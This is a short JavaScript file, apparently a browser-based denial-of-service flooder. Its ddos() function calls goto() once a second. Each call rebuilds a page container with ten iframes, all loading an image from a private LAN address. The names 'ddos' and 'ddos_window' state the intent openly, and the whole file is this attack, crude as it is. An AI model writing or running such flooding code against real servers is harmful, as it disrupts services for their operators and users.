function goto(address){
    let container=document.querySelector(".container");
    let parentNode=container.parentNode;
    parentNode.removeChild(container);
    container.innerHTML="";
    for(let i=0; i<10;i++){
        container.innerHTML+=/*html*/`<iframe class="ddos_window" src=${address}></iframe>`;
    }
    parentNode.appendChild(container);
}
// async function goto(address){
//     let res=await fetch(address)
//     console.log(await res.json())
// }
function ddos(){
    setInterval(()=>{goto("http://192.168.59.144:8080/bg.png");},1000)
}